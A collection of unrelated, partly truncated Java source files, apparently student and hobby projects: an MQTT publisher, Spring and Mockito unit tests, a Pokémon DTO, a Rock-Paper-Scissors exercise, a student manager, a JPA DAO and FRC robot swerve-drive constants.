    "package com.cjh.mqtt.sendclient;\n\nimport org.eclipse.paho.client.mqttv3.*;\nimport org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\n\nimport com.cjh.mqtt.util.MqttProperties;\n\nimport java.util.UUID;\n\n@Component\npublic class Send_Client {\n\n    private static final Logger logger = LoggerFactory.getLogger(Send_Client.class);\n\n    @Autowired\n    private SendClient_CallBack mqttSendCallBack;\n\n    @Autowired\n    private MqttProperties mqttProperties;\n\n    public MqttClient connect() {\n        MqttClient client = null;\n        try {\n        \t// \u5b9a\u4e49\u4e00\u4e2auuid\n            String uuid = UUID.randomUUID().toString().replaceAll(\"-\",\"\");\n            // \u521b\u5efa\u4e00\u4e2aid\u4e0d\u80fd\u91cd\u590d\u7684\u5ba2\u6237\u7aef\n            client = new MqttClient(\"192.168.1.102:1883\",uuid , new MemoryPersistence());\n            // \u8bbe\u7f6e\u57fa\u672c\u7684\u53c2\u6570\n            MqttConnectOptions options = new MqttConnectOptions();\n            options.setUserName(mqttProperties.getUsername());\n            options.setPassword(mqttProperties.getPassword().toCharArray());\n            options.setConnectionTimeout(mqttProperties.getTimeout());\n            options.setKeepAliveInterval(mqttProperties.getKeepAlive());\n            options.setCleanSession(true);\n            options.setAutomaticReconnect(false);\n            try {\n                // \u8bbe\u7f6e\u56de\u8c03\u65b9\u6cd5\n                client.setCallback(mqttSendCallBack);\n                client.connect(options);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return client;\n    }\n\n    /**\n     * \u53d1\u5e03\u6d88\u606f\n     * \u4e3b\u9898\u683c\u5f0f\uff1a server:report:$orgCode(\u53c2\u6570\u5b9e\u9645\u4f7f\u7528\u673a\u6784\u4ee3\u7801)\n     *\n     * @param retained    \u662f\u5426\u4fdd\u7559\n     * @param orgCode     orgId\n     * @param pushMessage \u6d88\u606f\u4f53\n     */\n    public void publish(boolean retained, String orgCode, String pushMessage) {\n        MqttMessage message = new MqttMessage();\n        message.setQos(mqttProperties.getQos());\n        message.setRetained(retained);\n        message.setPayload(pushMessage.getBytes());\n        MqttDeliveryToken token;\n        MqttClient mqttClient = connect();\n        try {\n            mqttClient.publish(\"server:report:\" + orgCode, message);\n            mqttClient.publish(orgCode, message);\n        } catch (MqttException e) {\n            e.printStackTrace();\n        } finally {\n            disconnect(mqttClient);\n            close(mqttClient);\n        }\n    }\n\n    /**\n     * \u5173\u95ed\u8fde\u63a5\n     *\n     * @param mqttClient\n     */\n    public static void disconnect(MqttClient mqttClient) {\n        try {\n            if (mqttClient != null) mqttClient.disconnect();\n        } catch (MqttException e) {\n            e.printStackTrace();\n        }\n    }\n\n    /**\n     * \u91ca\u653e\u8d44\u6e90\n     *\n     * @param mqttClient\n     */\n    public static void close(MqttClient mqttClient) {\n        try {\n            if (mqttClient != null) mqttClient.close();\n        } catch (MqttException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n",
    "package com.visualpathit.account.controllerTest;\n\nimport static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;\nimport static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;\nimport static org.springframework.test.web.servlet.result.MockMvcResultMatchers.forwardedUrl;\nimport static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;\nimport static org.springframework.test.web.servlet.result.MockMvcResultMatchers.view;\n\nimport org.junit.Before;\nimport org.junit.Test;\nimport org.mockito.InjectMocks;\nimport org.mockito.Mock;\nimport org.mockito.MockitoAnnotations;\nimport org.springframework.test.web.servlet.MockMvc;\nimport org.springframework.test.web.servlet.setup.MockMvcBuilders;\n\nimport com.visualpathit.account.controller.UserController;\nimport com.visualpathit.account.model.User;\nimport com.visualpathit.account.service.UserService;\nimport com.visualpathit.account.setup.StandaloneMvcTestViewResolver;\n\n\npublic class UserControllerTest {\n\t\n\t@Mock\n\tprivate UserService controllerSer;\n\t@InjectMocks\n\tprivate UserController controller;\n\tprivate MockMvc mockMvc;\n\t\n\t@Before\n\tpublic void setup(){\n\t\tMockitoAnnotations.initMocks(this);\n\t\t\n\t\t/*InternalResourceViewResolver viewResolver = new InternalResourceViewResolver();\n        viewResolver.setPrefix(\"/WEB-INF/views/\");\n        viewResolver.setSuffix(\".jsp\");\n\t\t*/\n\t\tmockMvc = MockMvcBuilders.standaloneSetup(controller)\n\t\t\t\t  .setViewResolvers(new StandaloneMvcTestViewResolver()).build();\n\t}\n\t\n\t@Test\n\tpublic void registrationTestforHappyFlow() throws Exception{\n\t\tUser user = new User();\n\t\tmockMvc.perform(get(\"/registration\"))\n        .andExpect(status().isOk())\n        .andExpect(view().name(\"registration\"))\n        .andExpect(forwardedUrl(\"registration\"));\n\t\t\n\t}\n\t@Test\n\tpublic void registrationTestforNullValueHappyFlow() throws Exception{\n\t\tmockMvc.perform(get(\"/registration\"))\n        .andExpect(status().isOk())\n        .andExpect(view().name(\"registration\"))\n        .andExpect(forwardedUrl(\"registration\"));\n\t\t\n\t}\n\t/*@Test\n\tpublic void registrationTestforPostValueHappyFlow() throws Exception{\n\t\tString description =new String(\"Error String\");\n\t\tUserValidator userValidator;\n\t\tBindingResult bindingResult;\n\t\twhen(userValidator.validate(new User(),bindingResult))\n\t\t.thenThrow(bindingResult.hasErrors());\n\t\tmockMvc.perform(post(\"/registration\").contentType(MediaType.APPLICATION_FORM_URLENCODED)\n                .param(\"userForm\",\"userForm\"))\n\t\t\n        .andExpect(status().isOk());\n        //.andExpect(view().name(\"redirect:/welcome\"))\n        //.andExpect(forwardedUrl(\"redirect:/welcome\"));\n\t\t\n\t}*/\n\t@Test\n\tpublic void loginTestHappyFlow() throws Exception{\n\t\tString error = \"Your username and password is invalid\";\n\t\tmockMvc.perform(get(\"/login\").param(error, error))\n        .andExpect(status().isOk())\n        .andExpect(view().name(\"login\"))\n        .andExpect(forwardedUrl(\"login\"));\n\t\t\n\t}\n\t@Test\n\tpublic void welcomeTestHappyFlow() throws Exception{\n\t\tmockMvc.perform(get(\"/welcome\"))\n        .andExpect(status().isOk())\n        .andExpect(view().name(\"welcome\"))\n        .andExpect(forwardedUrl(\"welcome\"));\n\t\t\n\t}\n\t@Test\n\tpublic void welcomeAfterDirectLoginTestHappyFlow() throws Exception{\n\t\tmockMvc.perform(get(\"/\"))\n        .andExpect(status().isOk())\n        .andExpect(view().name(\"welcome\"))\n        .andExpect(forwardedUrl(\"welcome\"));\n\t\t\n\t}\n\t@Test\n\tpublic void indexTestHappyFlow() throws Exception{\n\t\tmockMvc.perform(get(\"/index\"))\n        .andExpect(status().isOk())\n        .andExpect(view().name(\"index_home\"))\n        .andExpect(forwardedUrl(\"index_home\"));\n\t\t\n\t}\n\n}\n",
    "package com.inventory.App;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertThrows;\nimport static org.mockito.Mockito.*;\n\nimport java.util.Optional;\n\nimport org.junit.jupiter.api.Test;\nimport org.junit.jupiter.api.extension.ExtendWith;\nimport org.mockito.InjectMocks;\nimport org.mockito.Mock;\nimport org.mockito.junit.jupiter.MockitoExtension;\n\nimport com.inventory.app.entity.Products;\nimport com.inventory.app.repository.ProductRepository;\nimport com.inventory.app.service.ProductService;\n\n@ExtendWith(MockitoExtension.class)\npublic class ProductServiceTest {\n\n    @Mock\n    private ProductRepository productRepository;\n\n    @InjectMocks\n    private ProductService productService;\n\n    // This is the first test case, here we check if app is able to correctly find a product using its id\n    @Test\n    public void testGetProductById() {\n        // Arrange\n        long id = 1L;\n        Products product = new Products();\n        product.setId(id);\n        when(productRepository.findById(id)).thenReturn(Optional.of(product));\n\n        // Act\n        Optional<Products> result = productService.getProductById(id);\n\n        // Assert\n        assertEquals(Optional.of(product), result);\n    }\n\n    // Next here the test checks if the service is able to save a new product, comparing the test result and\n    // desired output to ensure its working correctly\n    @Test\n    public void testSaveProduct() {\n        // Arrange\n        Products product = new Products();\n        when(productRepository.save(product)).thenReturn(product);\n\n        // Act\n        Products result = productService.saveProduct(product);\n\n        // Assert\n        assertEquals(product, result);\n    }\n\n    \n    // Test whether deletion of product is working correctly\n    @Test\n    public void testDeleteProduct() {\n        // Arrange\n        long id = 1L;\n\n        // Act\n        productService.deleteProduct(id);\n\n        // Assert\n        verify(productRepository, times(1)).deleteById(id);\n    }\n\n    // Test whether products are being updated as required and ensure that product exists before updating\n    @Test\n    public void testUpdateProduct_WhenProductExists_ShouldUpdateAndReturnUpdatedProduct() {\n        // Arrange\n        Long id = 1L;\n        Products existingProduct = new Products();\n        existingProduct.setId(id);\n        existingProduct.setName(\"Existing Product\");\n        existingProduct.setDescription(\"Existing Description\");\n        existingProduct.setCurrentStock(10);\n        existingProduct.setMinimumStockLevel(5);\n\n        Products newProductData = new Products();\n        newProductData.setName(\"Updated Product\");\n        newProductData.setDescription(\"Updated Description\");\n        newProductData.setCurrentStock(20);\n        newProductData.setMinimumStockLevel(10);\n\n        when(productRepository.findById(id)).thenReturn(Optional.of(existingProduct));\n        when(productRepository.save(existingProduct)).thenReturn(existingProduct);\n\n        // Act\n        Products result = productService.updateProduct(id, newProductData);\n\n        // Assert\n        assertEquals(newProductData.getName(), result.getName());\n        assertEquals(newProductData.getDescription(), result.getDescription());\n        assertEquals(newProductData.getCurrentStock(), result.getCurrentStock());\n        assertEquals(newProductData.getMinimumStockLevel(), result.getMinimumStockLevel());\n        verify(productRepository, times(1)).findById(id);\n        verify(productRepository, times(1)).save(existingProduct);\n    }\n\n    // Test whether update is rejected if product does not exist in the database table\n    @Test\n    public void testUpdateProduct_WhenProductDoesNotExist_ShouldThrowRuntimeException() {\n        // Arrange\n        Long id = 1L;\n        Products newProductData = new Products();\n\n        when(productRepository.findById(id)).thenReturn(Optional.empty());\n\n        // Act and Assert\n        assertThrows(RuntimeException.class, () -> productService.updateProduct(id, newProductData));\n        verify(productRepository, times(1)).findById(id);\n        verifyNoMoreInteractions(productRepository);\n    }\n\n    // Test if stock quantity can be removed if there is sufficient stock\n    @Test\n    public void testRemoveStock_WhenStockIsSufficient_ShouldUpdateAndReturnUpdatedProduct() {\n        // Arrange\n        Long id = 1L;\n        int currentStockValue = 3;\n        Products existingProduct = new Products();\n        existingProduct.setId(id);\n        existingProduct.setCurrentStock(10);\n\n        when(productRepository.findById(id)).thenReturn(Optional.of(existingProduct));\n        when(productRepository.save(existingProduct)).thenReturn(existingProduct);\n\n        // Act\n        Products result = productService.removeStock(id, currentStockValue);\n\n        // Assert\n        assertEquals(7, result.getCurrentStock());\n        verify(productRepository, times(1)).findById(id);\n        verify(productRepository, times(1)).",
    "package co.edu.unbosque.model;\r\n\r\nimport java.io.Serializable;\r\n\r\npublic class PokemonBichoDTO extends PokemonDTO implements Serializable{\r\n\tprivate String tipoBicho;\r\n\tprivate boolean tieneAntenas;\r\n\t\r\n\tpublic PokemonBichoDTO() {\r\n\t\t// TODO Auto-generated constructor stub\r\n\t}\r\n\r\n\tpublic PokemonBichoDTO(String tipoBicho, boolean tieneAntenas) {\r\n\t\tsuper();\r\n\t\tthis.tipoBicho = tipoBicho;\r\n\t\tthis.tieneAntenas = tieneAntenas;\r\n\t}\r\n\r\n\tpublic PokemonBichoDTO(int generacion, int numero, String nombre, double altura, double peso, String color, int ps,\r\n\t\t\tint ataque, int defensa, int ataqueEspecial, int defensaEspecial, int velocidad, String descripAtaque,\r\n\t\t\tString habilidad, String habilidadOculta, String tipo) {\r\n\t\tsuper(generacion, numero, nombre, altura, peso, color, ps, ataque, defensa, ataqueEspecial, defensaEspecial, velocidad,\r\n\t\t\t\tdescripAtaque, habilidad, habilidadOculta, tipo);\r\n\t\t// TODO Auto-generated constructor stub\r\n\t}\r\n\r\n\tpublic PokemonBichoDTO(int generacion, int numero, String nombre, double altura, double peso, String color, int ps,\r\n\t\t\tint ataque, int defensa, int ataqueEspecial, int defensaEspecial, int velocidad, String descripAtaque,\r\n\t\t\tString habilidad, String habilidadOculta, String tipo, String tipoBicho, boolean tieneAntenas) {\r\n\t\tsuper(generacion, numero, nombre, altura, peso, color, ps, ataque, defensa, ataqueEspecial, defensaEspecial,\r\n\t\t\t\tvelocidad, descripAtaque, habilidad, habilidadOculta, tipo);\r\n\t\tthis.tipoBicho = tipoBicho;\r\n\t\tthis.tieneAntenas = tieneAntenas;\r\n\t}\r\n\r\n\tpublic String getTipoBicho() {\r\n\t\treturn tipoBicho;\r\n\t}\r\n\r\n\tpublic void setTipoBicho(String tipoBicho) {\r\n\t\tthis.tipoBicho = tipoBicho;\r\n\t}\r\n\r\n\tpublic boolean isTieneAntenas() {\r\n\t\treturn tieneAntenas;\r\n\t}\r\n\r\n\tpublic void setTieneAntenas(boolean tieneAntenas) {\r\n\t\tthis.tieneAntenas = tieneAntenas;\r\n\t}\r\n\r\n\t@Override\r\n\tpublic String toString() {\r\n\t\treturn super.toString() + \"\\nTipo de Bicho : \" + tipoBicho + \"\\nTiene Antenas : \" + tieneAntenas;\r\n\t}\r\n\t\r\n\t\r\n\t\r\n}\r\n",
    "package org.example;\nimport java.math.BigDecimal;\n\npublic class Main {\n//TIP To <b>Run</b> code, press <shortcut actionId=\"Run\"/> or\n// click the <icon src=\"AllIcons.Actions.Execute\"/> icon in the gutter.\n    public static void main(String[] args) {\n\n\n        Aluno a = new Aluno(\"Augusto\",\"211\",8,3,10);\n        Aluno b = new Aluno(\"Luiz\",\"211\",9,5,6.4);\n        Aluno c = new Aluno(\"Vitor\",\"211\",8.2,4.4,9);\n        Aluno d = new Aluno(\"Lucas\",\"211\",8,4,7.8);\n\n        System.out.println(\"o aluno de nome: \" + a.Getnome() + \" teve m\u00e9dia de: \" + a.Media() + \" pontos\");\n        System.out.println(\"o aluno de nome: \" + b.Getnome() + \" teve m\u00e9dia de: \" + b.Media() + \" pontos\");\n        System.out.println(\"o aluno de nome: \" + c.Getnome() + \" teve m\u00e9dia de: \" + c.Media() + \" pontos\");\n        System.out.println(\"o aluno de nome: \" + d.Getnome() + \" teve m\u00e9dia de: \" + d.Media() + \" pontos\");\n\n        System.out.println(a.Getnome() + \" foi: \" + a.Aprovado());\n        System.out.println(b.Getnome() + \" foi: \" + b.Aprovado());\n        System.out.println(c.Getnome() + \" foi: \" + c.Aprovado());\n        System.out.println(d.Getnome() + \" foi: \" + d.Aprovado());\n\n\n\n        }\n    }\n\n\n\n",
    "import static org.junit.jupiter.api.Assertions.*;\n\nimport ar.edu.utn.frba.dds.Alumno;\nimport ar.edu.utn.frba.dds.Inscripcion;\nimport ar.edu.utn.frba.dds.Materia;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.Test;\nimport java.util.HashSet;\nimport java.util.Set;\n\n\npublic class InscripcionTest {\n\n    private Alumno alumno;\n    private Set<Materia> materiasAprobadas;\n    private Inscripcion inscripcion;\n    private Materia matematicaDiscreta;\n    private Materia analisisMatematico;\n    private Materia matematicaSuperior;\n    private Materia analisisDos;\n\n    @BeforeEach\n    public void setUp() {\n        // Creamos instancias de las materias\n        matematicaDiscreta = new Materia(new HashSet<>());\n        analisisMatematico = new Materia(new HashSet<>());\n        matematicaSuperior = new Materia(Set.of(analisisMatematico, matematicaDiscreta));\n        analisisDos = new Materia(Set.of(analisisMatematico));\n\n        // Creamos un conjunto de materias aprobadas para el alumno\n        // Notar que no tiene matematicas discreta\n        materiasAprobadas = new HashSet<>();\n        materiasAprobadas.add(analisisMatematico);\n\n        // Creamos un alumno con las materias aprobadas\n        alumno = new Alumno(materiasAprobadas);\n    }\n\n    @Test\n    public void testAprobadaTodasCorrelativasAprobadas() {\n        // Creamos un conjunto de materias para la inscripci\u00f3n\n        Set<Materia> materiasInscripcion = Set.of(analisisDos);\n        inscripcion = new Inscripcion(alumno, materiasInscripcion);\n        assertTrue(inscripcion.aprobada());\n    }\n\n    @Test\n    public void testMateriasSinCorrelativas() {\n        // Creamos un conjunto de materias para la inscripci\u00f3n\n        Set<Materia> materiasInscripcion = Set.of(matematicaDiscreta);\n        inscripcion = new Inscripcion(alumno, materiasInscripcion);\n        assertTrue(inscripcion.aprobada());\n    }\n\n    @Test\n    public void testDesaprobadaAlgunaCorrelativaNoAprobada() {\n        // Creamos un conjunto de materias para la inscripci\u00f3n\n        // Agregamos una materia que el alumno no ha aprobado\n        Set<Materia> materiasInscripcion = Set.of(analisisDos, matematicaSuperior);\n        inscripcion = new Inscripcion(alumno, materiasInscripcion);\n        assertFalse(inscripcion.aprobada());\n    }\n}",
    "//    Copyright (c) The League of Amazing Programmers 2013-2019\n//    Level 0\n\npackage _01_random._2_rock_paper_scissors;\n\nimport java.awt.Dimension;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.util.Random;\n\nimport javax.swing.Icon;\nimport javax.swing.ImageIcon;\nimport javax.swing.JButton;\nimport javax.swing.JFrame;\nimport javax.swing.JLabel;\nimport javax.swing.JOptionPane;\nimport javax.swing.JPanel;\n\npublic class RockPaperScissors extends JPanel implements ActionListener{\n  \n\tprivate JFrame window = new JFrame(\"Rock Paper Scissors\");\n\tprivate JButton rockButton = new JButton();\n\tprivate JButton paperButton = new JButton();\n\tprivate JButton scissorsButton = new JButton();\n\n\tprivate JLabel instructionLabel = new JLabel();\n\n\tprivate Icon rockImage;\n\tprivate Icon paperImage;\n\tprivate Icon scissorsImage;\n\n\tprivate Dimension buttonDim = new Dimension(300, 200);\n    \n    public void run(){\n\n\t\ttry {\n\t\t\n\t\t\trockImage = new ImageIcon(getClass().getResource(\"rock.png\"));\n\t\t\tpaperImage = new ImageIcon(getClass().getResource(\"paper.jpeg\"));\n\t\t\tscissorsImage = new ImageIcon(getClass().getResource(\"scissors.jpeg\"));\n\n\t\t} catch (Exception ex) {\n\t\t\tJOptionPane.showMessageDialog(null, \"Cannot find one or more of your images\");\n\t\t}\n        \n\t\trockButton.setIcon(rockImage);\n\t\tpaperButton.setIcon(paperImage);\n\t\tscissorsButton.setIcon(scissorsImage);\n        \n        rockButton.addActionListener(this);\n        paperButton.addActionListener(this);\n        scissorsButton.addActionListener(this);\n        \n        rockButton.setPreferredSize(buttonDim);\n        paperButton.setPreferredSize(buttonDim);\n        scissorsButton.setPreferredSize(buttonDim);\n        \n        instructionLabel.setText(\"Choose Your Weapon!\");\n        \n        add(instructionLabel);\n        add(rockButton);\n        add(paperButton);\n        add(scissorsButton);\n        \n        window.add(this);\n        window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        window.setVisible(true);\n        window.pack();\n    }\n    \n    public static void main(String[] args) {\n        new RockPaperScissors().run();\n    }\n\n    @Override\n    public void actionPerformed(ActionEvent e) {\n        \n        //1. Run the program and play many rounds of Rock Paper Scissors. Does the computer always choose the same thing?\n\n        //2. Change the value of opponentSelection to be a random number between 0 and 2;\n        //   Don't forget to create a Random object.\n\t    \n        //2. Change the value of opponentSelection to be a random number between 0 and 2; \n    \tRandom ran = new Random();\nint opponentSelection = ran.nextInt(2);\n        \n        //3. Run the program again. Is the result different?\n \n        int selection = 0;\n       \n        if(e.getSource() == paperButton){\n            selection = 1;\n        }else if(e.getSource() == scissorsButton){\n            selection = 2;\n        }\n        \n        JOptionPane.showMessageDialog(null, \"You chose: \" + convertSelection(selection) + \".\\n\"\n                    + \"The computer chose: \" + convertSelection(opponentSelection) + \".\\n\");\n        \n        if(selection == opponentSelection){\n            JOptionPane.showMessageDialog(null, \"No Winner.  Play again.\");\n        }else if((selection == 0 && opponentSelection == 2) || \n                 (selection == 1 && opponentSelection == 0) ||\n                 (selection == 2 && opponentSelection == 1)){\n            JOptionPane.showMessageDialog(null, \"You Win!\");\n        }else{\n            JOptionPane.showMessageDialog(null, \"You Lose!\");\n        }\n    }\n    \n    private String convertSelection(int s){\n       if (s==0)\n            return \"ROCK\";\n       else if (s==1)\n            return \"PAPER\";\n       else if (s==2)\n            return \"SCISSORS\";\n       else\n            return \"\";\n        }\n    }\n    \n",
    "import java.io.*;\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\nimport java.util.Scanner;\r\n\r\nclass Student {\r\n    private String name;\r\n    private int rollNumber;\r\n    private String grade;\r\n\r\n    public Student(String name, int rollNumber, String grade) {\r\n        this.name = name;\r\n        this.rollNumber = rollNumber;\r\n        this.grade = grade;\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public int getRollNumber() {\r\n        return rollNumber;\r\n    }\r\n\r\n    public String getGrade() {\r\n        return grade;\r\n    }\r\n\r\n    @Override\r\n    public String toString() {\r\n        return \"Name: \" + name + \", Roll Number: \" + rollNumber + \", Grade: \" + grade;\r\n    }\r\n}\r\n\r\nclass StudentManagementSystem {\r\n    private List<Student> students;\r\n    private String fileName;\r\n\r\n    public StudentManagementSystem(String fileName) {\r\n        this.fileName = fileName;\r\n        students = new ArrayList<>();\r\n        loadStudents();\r\n    }\r\n\r\n    private void loadStudents() {\r\n        try (BufferedReader reader = new BufferedReader(new FileReader(fileName))) {\r\n            String line;\r\n            while ((line = reader.readLine()) != null) {\r\n                String[] parts = line.split(\",\");\r\n                if (parts.length == 3) {\r\n                    students.add(new Student(parts[0], Integer.parseInt(parts[1]), parts[2]));\r\n                }\r\n            }\r\n        } catch (IOException | NumberFormatException e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    private void saveStudents() {\r\n        try (BufferedWriter writer = new BufferedWriter(new FileWriter(fileName))) {\r\n            for (Student student : students) {\r\n                writer.write(student.getName() + \",\" + student.getRollNumber() + \",\" + student.getGrade() + \"\\n\");\r\n            }\r\n        } catch (IOException e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    public void addStudent(Student student) {\r\n        students.add(student);\r\n        saveStudents();\r\n    }\r\n\r\n    public void removeStudent(int rollNumber) {\r\n        students.removeIf(student -> student.getRollNumber() == rollNumber);\r\n        saveStudents();\r\n    }\r\n\r\n    public Student findStudent(int rollNumber) {\r\n        for (Student student : students) {\r\n            if (student.getRollNumber() == rollNumber) {\r\n                return student;\r\n            }\r\n        }\r\n        return null;\r\n    }\r\n\r\n    public void displayAllStudents() {\r\n        for (Student student : students) {\r\n            System.out.println(student);\r\n        }\r\n    }\r\n}\r\n\r\npublic class student_management {\r\n    public static void main(String[] args) {\r\n        StudentManagementSystem sms = new StudentManagementSystem(\"students.txt\");\r\n        Scanner scanner = new Scanner(System.in);\r\n        int choice;\r\n\r\n        do {\r\n            System.out.println(\"\\nStudent Management System\");\r\n            System.out.println(\"1. Add Student\");\r\n            System.out.println(\"2. Remove Student\");\r\n            System.out.println(\"3. Search for Student\");\r\n            System.out.println(\"4. Display All Students\");\r\n            System.out.println(\"5. Exit\");\r\n            System.out.print(\"Enter your choice: \");\r\n            choice = scanner.nextInt();\r\n            scanner.nextLine(); // Consume newline\r\n\r\n            switch (choice) {\r\n                case 1:\r\n                    System.out.print(\"Enter student name: \");\r\n                    String name = scanner.nextLine();\r\n                    System.out.print(\"Enter student roll number: \");\r\n                    int rollNumber = scanner.nextInt();\r\n                    scanner.nextLine(); // Consume newline\r\n                    System.out.print(\"Enter student grade: \");\r\n                    String grade = scanner.nextLine();\r\n                    sms.addStudent(new Student(name, rollNumber, grade));\r\n                    break;\r\n                case 2:\r\n                    System.out.print(\"Enter student roll number to remove: \");\r\n                    int rollToRemove = scanner.nextInt();\r\n                    sms.removeStudent(rollToRemove);\r\n                    break;\r\n                case 3:\r\n                    System.out.print(\"Enter student roll number to search: \");\r\n                    int rollToSearch = scanner.nextInt();\r\n                    Student foundStudent = sms.findStudent(rollToSearch);\r\n                    if (foundStudent != null) {\r\n                        System.out.println(\"Student found: \" + foundStudent);\r\n                    } else {\r\n                        System.out.println(\"Student not found.\");\r\n                    }\r\n                    break;\r\n                case 4:\r\n                    System.out.println(\"All Students:\");\r\n                    sms.displayAllStudents();\r\n                    break;\r\n                case 5:\r\n                    System.out.println(\"Exiting...\");\r\n                    break;\r\n                default:\r\n                    System.out.println(\"Invalid choice.",
    "package DAO;\n\nimport java.util.List;\n\nimport javax.persistence.EntityManager;\nimport javax.persistence.Query;\n\nimport entidades.Agenda;\nimport util.JPAUtil;\n\npublic class AgendaDAO {\n\t//salvar, editar, excluir e listar\n\t\n\tpublic static void salvar(Agenda agenda) {\n\t\tEntityManager em = JPAUtil.criarEntityManager();\n\t\tem.getTransaction().begin();\n\t\tem.persist(agenda);\n\t\tem.getTransaction().commit();\n\t\tem.close();\n\t}\n\t\n\tpublic static void editar(Agenda agenda) {\n\t\tEntityManager em = JPAUtil.criarEntityManager();\n\t\tem.getTransaction().begin();\n\t\tem.merge(agenda);\n\t\tem.getTransaction().commit();\n\t\tem.close();\n\t}\n\t\n\tpublic static void excluir(Agenda agenda) {\n\t\tEntityManager em = JPAUtil.criarEntityManager();\n\t\tem.getTransaction().begin();\n\t\tem.remove(agenda);\n\t\tem.getTransaction().commit();\n\t\tem.close();\n\t}\n\t\n\tpublic static List<Agenda> listar() {\n\t\tEntityManager em = JPAUtil.criarEntityManager();\n\t\tQuery qry = em.createQuery(\"select a from Agenda a\");\n\t\tList<Agenda> resultado = qry.getResultList();\n\t\treturn resultado;\n\t}\n\t\n\t/*PODE ALTERAR SE PREFERIR*/\n\tpublic static long contar() {\n\t\tEntityManager em = JPAUtil.criarEntityManager();\n\t\tQuery qry = em.createNamedQuery(\"select count(a) from Agenda a\");\n\t\tlong qtd = (long) qry.getSingleResult();\n\t\tem.close();\n\t\treturn qtd;\n\t}\n\t// contar o n\u00famero de objetos na tabela. \n\t// count() >> retorna o n\u00famero de resultaados\n\t// getSingleResult() \u00e9 usado para obter esse valor como um resultado \u00fanico\n\t\n\t\n}\n",
    "package frc.robot;\n\nimport com.ctre.phoenix6.signals.InvertedValue;\nimport com.ctre.phoenix6.signals.NeutralModeValue;\nimport com.ctre.phoenix6.signals.SensorDirectionValue;\n\nimport edu.wpi.first.math.geometry.Rotation2d;\nimport edu.wpi.first.math.geometry.Translation2d;\nimport edu.wpi.first.math.kinematics.SwerveDriveKinematics;\nimport edu.wpi.first.math.trajectory.TrapezoidProfile;\nimport edu.wpi.first.math.util.Units;\nimport frc.lib.util.COTSTalonFXSwerveConstants;\nimport frc.lib.util.SwerveModuleConstants;\n\npublic final class Constants {\n    public static final double stickDeadband = 0.1;\n\n    public static final class Swerve {\n        public static final int pigeonID = 17;\n\n        public static final COTSTalonFXSwerveConstants chosenModule =  //TODO: This must be tuned to specific robot\n        COTSTalonFXSwerveConstants.SDS.MK4i.Falcon500(COTSTalonFXSwerveConstants.SDS.MK4i.driveRatios.L2);\n\n        /* Drivetrain Constants */\n        public static final double trackWidth = Units.inchesToMeters(21.73); //TODO: This must be tuned to specific robot\n        public static final double wheelBase = Units.inchesToMeters(21.73); //TODO: This must be tuned to specific robot\n        public static final double wheelCircumference = chosenModule.wheelCircumference;\n\n        /* Swerve Kinematics \n         * No need to ever change this unless you are not doing a traditional rectangular/square 4 module swerve */\n         public static final SwerveDriveKinematics swerveKinematics = new SwerveDriveKinematics(\n            new Translation2d(wheelBase / 2.0, trackWidth / 2.0),\n            new Translation2d(wheelBase / 2.0, -trackWidth / 2.0),\n            new Translation2d(-wheelBase / 2.0, trackWidth / 2.0),\n            new Translation2d(-wheelBase / 2.0, -trackWidth / 2.0));\n\n        /* Module Gear Ratios */\n        public static final double driveGearRatio = chosenModule.driveGearRatio;\n        public static final double angleGearRatio = chosenModule.angleGearRatio;\n\n        /* Motor Inverts */\n        public static final InvertedValue angleMotorInvert = chosenModule.angleMotorInvert;\n        public static final InvertedValue driveMotorInvert = chosenModule.driveMotorInvert;\n\n        /* Angle Encoder Invert */\n        public static final SensorDirectionValue cancoderInvert = chosenModule.cancoderInvert;\n\n        /* Swerve Current Limiting */\n        public static final int angleCurrentLimit = 25; \n        public static final int angleCurrentThreshold = 40;\n        public static final double angleCurrentThresholdTime = 0.1;\n        public static final boolean angleEnableCurrentLimit = true;\n\n        public static final int driveCurrentLimit = 35;\n        public static final int driveCurrentThreshold = 60;\n        public static final double driveCurrentThresholdTime = 0.1;\n        public static final boolean driveEnableCurrentLimit = true;\n\n        /* These values are used by the drive falcon to ramp in open loop and closed loop driving.\n         * We found a small open loop ramp (0.25) helps with tread wear, tipping, etc */\n        public static final double openLoopRamp = 0.25;\n        public static final double closedLoopRamp = 0.0;\n\n        /* Angle Motor PID Values */\n        public static final double angleKP = chosenModule.angleKP;\n        public static final double angleKI = chosenModule.angleKI;\n        public static final double angleKD = chosenModule.angleKD;\n\n        /* Drive Motor PID Values */\n        public static final double driveKP = 0.12; //TODO: This must be tuned to specific robot\n        public static final double driveKI = 0.0;\n        public static final double driveKD = 0.0;\n        public static final double driveKF = 0.0;\n\n        /* Drive Motor Characterization Values From SYSID */\n        public static final double driveKS = 0.32; //TODO: This must be tuned to specific robot\n        public static final double driveKV = 1.51;\n        public static final double driveKA = 0.27;\n\n        /* Swerve Profiling Values */\n        /** Meters per Second */\n        public static final double maxSpeed = 5.5 ; //TODO: This must be tuned to specific robot\n        /** Radians per Second */\n        public static final double maxAngularVelocity = 10.0; //TODO: This must be tuned to specific robot\n\n        /* Neutral Modes */\n        public static final NeutralModeValue angleNeutralMode = NeutralModeValue.Coast;\n        public static final NeutralModeValue driveNeutralMode = NeutralModeValue.Brake;\n\n        /* Module Specific Constants */\n        /* Front Left Module - Module 0 */\n        public static final class Mod0 { //TODO: This must be tuned to specific robot\n            public static final int driveMotorID = 10;\n            public static final int angleMotorID = 12;\n            public static final int canCoderID = 11;\n            public static final Rotation2d angleOffset = Rotation2d.fromDegrees(259.7);\n            public static final SwerveModuleConstants constants = \n                new 